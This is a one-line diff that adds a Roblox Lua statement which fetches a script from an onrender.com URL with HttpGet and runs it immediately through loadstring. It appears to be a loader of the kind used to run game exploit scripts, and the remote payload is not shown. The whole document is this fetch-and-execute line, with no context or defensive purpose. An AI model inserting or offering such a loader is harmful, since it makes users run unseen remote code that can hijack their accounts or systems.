@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://zumaru-33mp.onrender.com/script.lua"))()
